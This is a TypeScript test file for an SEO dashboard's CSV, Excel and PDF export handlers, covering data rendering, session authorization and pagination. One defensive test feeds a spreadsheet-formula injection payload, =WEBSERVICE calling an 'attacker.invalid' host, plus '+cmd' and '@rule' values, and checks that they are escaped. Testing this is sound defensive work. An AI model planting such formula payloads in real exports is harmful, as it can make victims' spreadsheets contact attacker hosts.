import assert from "node:assert/strict";
import test from "node:test";
import type { DatasetMeta, Period } from "@reportingdash/site-seo-contract";
import * as XLSX from "xlsx";
import { buildDashboardExportRows, buildExportRows, buildGscExportRows, toCsv } from "../src/lib/exports.ts";
import { createExcelExportHandler, createIntentQueryHandler, createPdfExportHandler, parseIntentQueryOptions } from "../src/lib/route-handlers.ts";
import { createPeriodSelection } from "../src/lib/period-selection.ts";

const period: Period = { kind: "iso_week", key: "2026-W01", from: "2025-12-29", to: "2026-01-04", sourceTimezone: "Europe/Moscow" };
const selection = createPeriodSelection({ primaryWeek: "2026-W01", aliceMonth: "2026-01", gsc: period }, "Europe/Moscow");
const readRequest = { slug: "medroche", selection, publicationId: "publication-7", filters: { country: "RU" } } as const;
const meta: DatasetMeta = { sourceKey: "google_search_console", period: null, state: "missing", collectionMode: "manual", completeness: "unknown", importId: null, exportedAt: null, loadedAt: null, freshness: "unknown", latestAttempt: "none" };

test("exports actual period and the missing-data limitation instead of a zero result", () => {
  const csv = toCsv(buildExportRows({ period, source: meta, title: "Поиск Google" }));
  assert.match(csv, /2025-12-29/);
  assert.match(csv, /Нужна выгрузка/);
  assert.doesNotMatch(csv, /0,00/);
});

test("exports a failed latest attempt while preserving older published facts", () => {
  const rows = buildExportRows({ period, source: { ...meta, state: "partial", completeness: "limited", latestAttempt: "failed" }, title: "Wordstat" });
  assert.match(toCsv(rows), /Последняя попытка сбора завершилась ошибкой; показаны ранее опубликованные данные/);
});

test("exports canonical GSC summary, daily facts, and exact dimension rows", () => {
  const rows = buildGscExportRows({ period, source: { ...meta, state: "ready", period }, summary: { clicks: 7, impressions: 100, ctrPct: 7, averagePosition: 3 }, daily: [{ date: "2026-01-02", metrics: { clicks: 2, impressions: 10, ctrPct: 20, averagePosition: 2 } }], dimensions: [{ dimension: "query", value: "онкология", metrics: { clicks: 2, impressions: 10, ctrPct: 20, averagePosition: 2 } }] });
  assert.match(toCsv(rows), /онкология/);
  assert.match(toCsv(rows), /2026-01-02/);
  assert.match(toCsv(rows), /Итоговые клики/);
});

test("omits GSC rows from an export when GSC is disabled in the profile", () => {
  const rows = buildDashboardExportRows({ profile: { sources: [{ sourceKey: "google_search_console", mode: "disabled", bindingId: null, importCadence: [] }, { sourceKey: "yandex_webmaster", mode: "automated", bindingId: "webmaster", importCadence: [] }] } as never, selection, model: { gsc: { meta, summary: { clicks: 999, impressions: 999, ctrPct: 99, averagePosition: 1 }, daily: [], dimensions: [], dimensionMeta: {} }, datasets: { yandex_webmaster: { ...meta, sourceKey: "yandex_webmaster", state: "ready" } } } });
  assert.doesNotMatch(toCsv(rows), /Google Search Console|999/);
  assert.match(toCsv(rows), /yandex_webmaster/);
});

test("exports the same canonical Metrika and Webmaster facts shown by the dashboard", () => {
  const rows = buildDashboardExportRows({
    profile: { sources: [
      { sourceKey: "google_search_console", mode: "disabled", bindingId: null, importCadence: [] },
      { sourceKey: "yandex_metrika", mode: "automated", bindingId: "metrika", importCadence: [] },
      { sourceKey: "yandex_webmaster", mode: "automated", bindingId: "webmaster", importCadence: [] },
    ] } as never,
    selection,
    model: {
      gsc: { meta, summary: null, daily: [], dimensions: [], dimensionMeta: {} },
      datasets: {
        yandex_metrika: { ...meta, sourceKey: "yandex_metrika", state: "ready", period },
        yandex_webmaster: { ...meta, sourceKey: "yandex_webmaster", state: "partial", period },
      },
      metrika: { ...meta, sourceKey: "yandex_metrika", state: "ready", period, kind: "metrika", summary: { visits: 20, pageviews: 30 }, daily: [{ date: "2026-01-02", visits: 4, pageviews: 6, users: 3 }], topPages: [{ page: "/a", visits: 4, pageviews: 6 }] },
      webmaster: { ...meta, sourceKey: "yandex_webmaster", state: "partial", period, kind: "webmaster", summary: { clicks: 5, impressions: 50, ctrPct: 10, averagePosition: 3 }, daily: [{ date: "2026-01-02", metrics: { clicks: 5, impressions: 50, ctrPct: 10, averagePosition: 3 } }], topPages: [{ page: "/a", metrics: { clicks: 5, impressions: 50, ctrPct: 10, averagePosition: 3 } }] },
    },
  });
  const csv = toCsv(rows);
  assert.match(csv, /Визиты Metrika.*20/);
  assert.match(csv, /Показы Webmaster.*50/);
  assert.match(csv, /Пользователи за день 2026-01-02.*3/);
  assert.doesNotMatch(csv, /Пользователи за период/);
});

test("exports selected traffic comparison period and its canonical metrics", () => {
  const comparison = createPeriodSelection({ primaryWeek: "2026-W01", comparisonWeek: "2025-W52", aliceMonth: "2026-01", gsc: period }, "Europe/Moscow");
  const rows = buildDashboardExportRows({
    profile: { sources: [{ sourceKey: "yandex_metrika", mode: "automated", bindingId: "metrika", importCadence: [] }] } as never,
    selection: comparison,
    model: {
      gsc: { meta, summary: null, daily: [], dimensions: [], dimensionMeta: {} },
      datasets: { yandex_metrika: { ...meta, sourceKey: "yandex_metrika", state: "ready", period } },
      metrika: null,
      webmaster: null,
      trafficComparison: {
        yandex_metrika: { ...meta, sourceKey: "yandex_metrika", state: "ready", period: comparison.traffic.comparison!, kind: "metrika", summary: { visits: 98765, pageviews: 123456 }, daily: [], topPages: [] },
      },
    },
  } as never);
  const csv = toCsv(rows);
  assert.match(csv, /Сравнение.*2025-W52/);
  assert.match(csv, /98765/);
});

test("exports actual Wordstat snapshot windows, Alice query sources, and published SEO OS evidence", () => {
  const rows = buildDashboardExportRows({
    profile: { sources: [
      { sourceKey: "yandex_wordstat", mode: "automated", bindingId: "wordstat", importCadence: [] },
      { sourceKey: "yandex_webmaster_alice_manual", mode: "manual", bindingId: "alice", importCadence: [] },
      { sourceKey: "seo_os", mode: "automated", bindingId: "seo-os", importCadence: [] },
    ] } as never,
    selection,
    model: {
      gsc: { meta, summary: null, daily: [], dimensions: [], dimensionMeta: {} },
      datasets: {},
      wordstat: {
        ...meta, sourceKey: "yandex_wordstat", period: selection.traffic.primary, snapshotPeriod: { kind: "custom", key: "rolling:2026-07-27:2026-08-25", from: "2026-07-27", to: "2026-08-25", sourceTimezone: "Europe/Moscow" }, state: "partial", completeness: "unknown", kind: "wordstat", demand: 35,
        queries: [{ query: "лечение", kind: "popular", count: 100, window: { from: "2026-07-27", to: "2026-08-25", snapshotDate: "2026-08-25", registryVersion: "registry-2", importId: "run-2" } }],
      },
      alice: {
        ...meta, sourceKey: "yandex_webmaster_alice_manual", period: selection.alice, state: "ready", completeness: "complete", kind: "alice", officialSovPct: 43.91, officialSovPeriod: selection.alice, officialSovHistory: [], samplePresencePct: 43.87, competitors: [], sources: ["one.test"],
        queries: [{ query: "лечение", portalPresent: true, portalPosition: 2, portalUrl: "https://portal.test/a", sources: [{ rank: 1, domain: "one.test", url: "https://one.test/a" }] }],
      },
      seoOs: {
        ...meta, sourceKey: "seo_os", period: { kind: "iso_week", key: "2026-W02", from: "2026-01-05", to: "2026-01-11", sourceTimezone: "Europe/Moscow" }, state: "partial", completeness: "unknown", kind: "seo_os",
        observationPeriod: { kind: "iso_week", key: "2026-W02", from: "2026-01-05", to: "2026-01-11", sourceTimezone: "Europe/Moscow" },
        observationDate: "2026-01-09",
        selectionPeriod: period,
        positions: [{ week: "2026-W02", section: "diseases", clusterId: "cancer", query: "лечение рака", serpPosition: 4.5, deltaPrev: -2, matchedUrl: "https://example.test/diseases/cancer/", status: "found", checkedAt: "2026-01-09 10:00:00", ingestionRunId: "seo-run-1" }],
        rows: [],
        recommendations: [{ kind: "topic_opportunity", topic: "Онкология", pageUrl: "https://example.test/oncology", action: "Добавить раздел", sourceIds: ["opp-1"], sourcePeriods: ["2026-W01"], ruleVersion: "v3", publicationStatus: "published" }],
        tasks: [{ id: "task-1", status: "open" }],
      },
    },
  } as never);
  const csv = toCsv(rows);
  assert.match(csv, /Период от.*2025-12-29/);
  assert.match(csv, /Спрос Wordstat.*35/);
  assert.match(csv, /Окно snapshot Wordstat.*2026-07-27.*2026-08-25/);
  assert.match(csv, /snapshot 2026-08-25/);
  assert.match(csv, /Официальный SOV Алиса.*43\.91/);
  assert.match(csv, /Sample presence Алиса.*43\.87/);
  assert.match(csv, /Запрос Алиса: лечение.*1\. one\.test/);
  assert.match(csv, /Рекомендация SEO OS: Онкология.*Добавить раздел.*rule: v3/);
  assert.match(csv, /Задача SEO OS task-1.*open/);
  assert.match(csv, /Период наблюдения SEO OS.*2026-W02.*2026-01-05.*2026-01-11.*2026-01-09/);
  assert.match(csv, /Период выбора SEO OS.*2026-W01.*2025-12-29.*2026-01-04/);
  assert.match(csv, /Позиция SEO OS: лечение рака.*позиция 4\.5.*дельта -2.*статус found.*URL https:\/\/example\.test\/diseases\/cancer\/.*checked 2026-01-09 10:00:00.*import seo-run-1/);
});

test("exports generic target-intent label, active provenance, matched rule and match type", () => {
  const rows = buildDashboardExportRows({
    profile: { sources: [] } as never,
    selection,
    model: {
      gsc: { meta, summary: null, daily: [], dimensions: [], dimensionMeta: {} },
      datasets: {},
      targetIntent: {
        siteId: "site-clinic", dashboardId: 77, versionId: "intent-version-9", label: "Запросы пациентов", state: "ready",
        period, sources: [],
        provenance: { importId: "91", publicationId: "92", sourceTransport: "google_sheet", sourceIdentity: "docs.google.com/spreadsheets/d/example", contentSha256: "b".repeat(64), publishedAt: "2026-09-15T13:00:00Z", publishedBy: "admin@example.test", comment: "approved" },
        target: { label: "Запросы пациентов", impressions: 90, clicks: 9, sharePct: 90, queryCount: 1 },
        other: { label: "Остальные запросы", impressions: 10, clicks: 1, sharePct: 10, queryCount: 1 },
        queries: [
          { query: "лечение", source: "google", impressions: 90, clicks: 9, category: "target", group: "Услуги", matchedRule: "лечение", matchType: "phrase" },
          { query: "погода", source: "yandex", impressions: 10, clicks: 1, category: "other", group: null, matchedRule: null, matchType: null },
        ],
      },
    },
  } as never);
  const text = rows.map((row) => `${row.field}: ${row.value}`).join("\n");
  assert.match(text, /Целевой интент: 2025-12-29 — 2026-01-04/);
  assert.match(text, /Метка целевого интента: Запросы пациентов/);
  assert.match(text, /Активная версия правил: intent-version-9/);
  assert.match(text, /Источник правил: google_sheet.*docs\.google\.com.*publication 92.*import 91.*SHA-256 b{64}/);
  assert.match(text, /Запросы пациентов · показы: 90/);
  assert.match(text, /лечение.*target.*правило лечение.*тип phrase.*группа Услуги/);
  assert.match(text, /погода.*other.*правило не найдено.*тип нет/);
  assert.doesNotMatch(text, /Медицинский интент|экспертного ядра|Шум/);
});

test("refuses an export session from another dashboard before any canonical read", async () => {
  let calls = 0;
  const response = await createExcelExportHandler({
    registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche" } as never, bindings: [] },
    credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 99, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }),
    execute: async () => { calls += 1; throw new Error("must not read"); },
  })(readRequest);
  assert.equal(response.status, 401);
  assert.equal(calls, 0);
});

test("creates an Excel workbook from the same scoped read model", async () => {
  const response = await createExcelExportHandler({
    registration: { profile: { clientId: "client-med", dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [{ sourceKey: "google_search_console", mode: "manual", bindingId: "gsc", importCadence: [] }] } as never, bindings: [{ bindingId: "gsc", clientId: "client-med", siteId: "site-med", dashboardId: 42, sourceKey: "google_search_console", analyticsAccountId: "account", resourceId: "resource" }] },
    credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }),
    execute: async () => ({ meta: { ...meta, state: "complete_empty", period }, summary: null, daily: [], dimensions: [], indexing: meta }),
  })(readRequest);
  assert.equal(response.headers.get("content-type"), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
  const workbook = XLSX.read(await response.arrayBuffer(), { type: "array" });
  assert.deepEqual(workbook.SheetNames, ["SEO"]);
  const rows = XLSX.utils.sheet_to_json<Record<string, string>>(workbook.Sheets.SEO!);
  assert.ok(rows.length > 0);
  assert.ok(rows.some((row) => row.field === "Период от" && row.value === "2025-12-29"));
  assert.ok(rows.some((row) => row.field === "Источник" && row.value === "google_search_console"));
});

test("renders a real PDF only after the same site-scoped authorization and read", async () => {
  let closed = false;
  let setContentWaitUntil: string | null = null;
  let launchedExecutablePath: string | null = null;
  const response = await createPdfExportHandler({
    registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [{ sourceKey: "google_search_console", mode: "manual", bindingId: "gsc", importCadence: [] }] } as never, bindings: [{ bindingId: "gsc", clientId: "client-med", siteId: "site-med", dashboardId: 42, sourceKey: "google_search_console", analyticsAccountId: "account", resourceId: "resource" }] },
    credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }),
    execute: async () => ({ meta: { ...meta, state: "complete_empty", period }, summary: null, daily: [], dimensions: [], indexing: meta }),
  }, { executablePath: "/opt/chromium/chrome", launch: async (options) => { launchedExecutablePath = options.executablePath ?? null; return { newPage: async () => ({ setViewport: async () => {}, emulateMediaType: async () => {}, setContent: async (_html, pageOptions) => { setContentWaitUntil = pageOptions.waitUntil; }, pdf: async () => new Uint8Array([37, 80, 68, 70]) }), close: async () => { closed = true; } }; } })(readRequest);
  assert.equal(response.headers.get("content-type"), "application/pdf");
  assert.deepEqual([...new Uint8Array(await response.arrayBuffer())], [37, 80, 68, 70]);
  assert.equal(closed, true);
  assert.equal(setContentWaitUntil, "load");
  assert.equal(launchedExecutablePath, "/opt/chromium/chrome");
});

test("returns 401 for a stale PDF session before the canonical read or browser launch", async () => {
  let reads = 0;
  let launches = 0;
  const response = await createPdfExportHandler({
    registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche" } as never, bindings: [] },
    credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 0, expiresAt: "2026-10-01T00:00:00Z" }),
    execute: async () => { reads += 1; throw new Error("must not read"); },
  }, { launch: async () => { launches += 1; throw new Error("must not launch"); } })(readRequest);
  assert.equal(response.status, 401);
  assert.equal(reads, 0);
  assert.equal(launches, 0);
});

test("reports an authorized Excel read failure as unavailable", async () => {
  const response = await createExcelExportHandler({
    registration: { profile: { clientId: "client-med", dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [{ sourceKey: "google_search_console", mode: "manual", bindingId: "gsc", importCadence: [] }] } as never, bindings: [{ bindingId: "gsc", clientId: "client-med", siteId: "site-med", dashboardId: 42, sourceKey: "google_search_console", analyticsAccountId: "account", resourceId: "resource" }] },
    credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }),
    execute: async () => { throw new Error("database unavailable"); },
  })(readRequest);
  assert.equal(response.status, 503);
});

test("bounds intent query pagination and rejects invalid categories and formats", () => {
  assert.deepEqual(parseIntentQueryOptions(new URL("https://example.test?intent_category=target&intent_page=999999&intent_page_size=999999&intent_format=json&intent_publication=92")), {
    category: "target", page: 10_000, pageSize: 100, format: "json", expectedPublicationId: "92",
  });
  assert.throws(() => parseIntentQueryOptions(new URL("https://example.test?intent_category=noise")));
  assert.throws(() => parseIntentQueryOptions(new URL("https://example.test?intent_category=target&intent_format=pdf")));
  assert.equal(parseIntentQueryOptions(new URL("https://example.test?intent_category=target")).expectedPublicationId, null);
  assert.equal(parseIntentQueryOptions(new URL("https://example.test?intent_category=target&intent_publication=")).expectedPublicationId, null);
});

const intentModel = {
  gsc: { meta, summary: null, daily: [], dimensions: [], dimensionMeta: {} }, indexing: meta, datasets: {}, metrika: null, webmaster: null, wordstat: null, alice: null, seoOs: null, trafficComparison: {},
  targetIntent: {
    siteId: "site-med", dashboardId: 42, versionId: "v9", label: "Запросы пациентов", state: "ready" as const, period,
    provenance: { importId: "91", publicationId: "92", sourceTransport: "upload" as const, sourceIdentity: "rules.xlsx", contentSha256: "a".repeat(64), publishedAt: "2026-09-15T12:00:00Z", publishedBy: "admin@example.test", comment: null },
    target: { label: "Запросы пациентов", impressions: 30, clicks: 3, sharePct: 75, queryCount: 2 }, other: { label: "Остальные запросы", impressions: 10, clicks: 1, sharePct: 25, queryCount: 1 }, sources: [],
    queries: [
      { query: "альфа", source: "google" as const, impressions: 20, clicks: 2, category: "target" as const, group: "А", matchedRule: "альфа", matchType: "exact" as const },
      { query: "бета", source: "yandex" as const, impressions: 10, clicks: 1, category: "target" as const, group: "Б", matchedRule: "бета", matchType: "phrase" as const },
      { query: "прочее", source: "google" as const, impressions: 10, clicks: 1, category: "other" as const, group: null, matchedRule: null, matchType: null },
    ],
  },
};

test("returns an authorized category page for the selected period and active publication", async () => {
  const response = await createIntentQueryHandler({
    registration: { profile: { clientId: "client-med", dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }),
    execute: async () => { throw new Error("use injected model"); },
  }, { loadModel: async () => intentModel as never })({ ...readRequest, intent: { category: "target", page: 1, pageSize: 1, format: "json", expectedPublicationId: "92" } });
  assert.equal(response.status, 200);
  assert.equal(response.headers.get("cache-control"), "private, no-store");
  assert.deepEqual(await response.json(), {
    category: "target", label: "Запросы пациентов", period, activePublicationId: "92", page: 1, pageSize: 1, totalRows: 2, totalPages: 2,
    rows: [intentModel.targetIntent.queries[0]],
  });
});

test("rejects stale publication tokens and foreign dashboard sessions before disclosure", async () => {
  let reads = 0;
  const dependencies = { registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
    getSession: async () => ({ audience: "viewer" as const, family: "site_seo" as const, dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); } };
  const stale = await createIntentQueryHandler(dependencies, { loadModel: async () => { reads += 1; return intentModel as never; } })({ ...readRequest, intent: { category: "other", page: 1, pageSize: 50, format: "csv", expectedPublicationId: "old" } });
  assert.equal(stale.status, 409);
  assert.equal(reads, 1);

  const unauthorized = await createIntentQueryHandler({ ...dependencies, getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 99, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }) }, { loadModel: async () => { reads += 1; return intentModel as never; } })({ ...readRequest, intent: { category: "other", page: 1, pageSize: 50, format: "csv", expectedPublicationId: "92" } });
  assert.equal(unauthorized.status, 401);
  assert.equal(reads, 1);
});

test("requires omitted, empty, stale and valid publication tokens according to the loaded intent state", async () => {
  const dependencies = { registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
    getSession: async () => ({ audience: "viewer" as const, family: "site_seo" as const, dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); } };
  const handler = createIntentQueryHandler(dependencies, { loadModel: async () => intentModel as never });
  const options = (query: string) => parseIntentQueryOptions(new URL(`https://example.test?intent_category=target${query}`));

  for (const query of ["", "&intent_publication=", "&intent_publication=old"]) {
    const response = await handler({ ...readRequest, intent: options(query) });
    assert.equal(response.status, 409, query || "omitted");
    assert.deepEqual(await response.json(), { error: "intent_publication_changed", activePublicationId: "92" });
  }
  assert.equal((await handler({ ...readRequest, intent: options("&intent_publication=92") })).status, 200);

  for (const state of ["not_configured", "unavailable"] as const) {
    const nonReady = { ...intentModel, targetIntent: { ...intentModel.targetIntent, state, provenance: null, versionId: null } };
    const response = await createIntentQueryHandler(dependencies, { loadModel: async () => nonReady as never })({ ...readRequest, intent: options("") });
    assert.equal(response.status, 503, state);
    assert.deepEqual(await response.json(), { error: "intent_classification_unavailable" });
  }
});

test("downloads only the requested category with review fields and active publication", async () => {
  const handler = createIntentQueryHandler({
    registration: { profile: { clientId: "client-med", dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); },
  }, { loadModel: async () => intentModel as never });
  const csvResponse = await handler({ ...readRequest, intent: { category: "other", page: 1, pageSize: 50, format: "csv", expectedPublicationId: "92" } });
  const csv = await csvResponse.text();
  assert.match(csv, /Активная публикация;92/);
  assert.match(csv, /2025-12-29;2026-01-04/);
  assert.match(csv, /прочее;Google;10;1;не найдено правило/);
  assert.doesNotMatch(csv, /альфа|бета/);

  const xlsxResponse = await handler({ ...readRequest, intent: { category: "target", page: 1, pageSize: 50, format: "xlsx", expectedPublicationId: "92" } });
  assert.equal(xlsxResponse.headers.get("content-type"), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
  const workbook = XLSX.read(await xlsxResponse.arrayBuffer(), { type: "array" });
  const rows = XLSX.utils.sheet_to_json<Record<string, string | number>>(workbook.Sheets[workbook.SheetNames[0]!]!);
  assert.equal(rows[0]?.["Активная публикация"], "92");
  assert.ok(rows.some((row) => row["Запрос"] === "альфа" && row["Тип совпадения"] === "точное"));
  assert.ok(rows.every((row) => row["Запрос"] !== "прочее"));
});

test("neutralizes spreadsheet formulas in attacker-influenced CSV fields", async () => {
  const maliciousModel = {
    ...intentModel,
    targetIntent: {
      ...intentModel.targetIntent,
      queries: [{ query: "=WEBSERVICE(\"https://attacker.invalid\")", source: "google" as const, impressions: 10, clicks: 1, category: "target" as const, group: "+cmd", matchedRule: "@rule", matchType: "exact" as const }],
    },
  };
  const response = await createIntentQueryHandler({
    registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); },
  }, { loadModel: async () => maliciousModel as never })({ ...readRequest, intent: { category: "target", page: 1, pageSize: 50, format: "csv", expectedPublicationId: "92" } });
  const csv = await response.text();
  assert.match(csv, /'=WEBSERVICE/);
  assert.match(csv, /;'\+cmd;/);
  assert.match(csv, /;'@rule;/);
  assert.doesNotMatch(csv, /(?:^|;)=WEBSERVICE|(?:^|;)\+cmd|(?:^|;)@rule/m);
});

test("clamps an out-of-range JSON page to the last available page", async () => {
  const response = await createIntentQueryHandler({
    registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); },
  }, { loadModel: async () => intentModel as never })({ ...readRequest, intent: { category: "target", page: 10_000, pageSize: 1, format: "json", expectedPublicationId: "92" } });
  const body = await response.json();
  assert.equal(body.page, 2);
  assert.equal(body.totalPages, 2);
  assert.deepEqual(body.rows, [intentModel.targetIntent.queries[1]]);
});
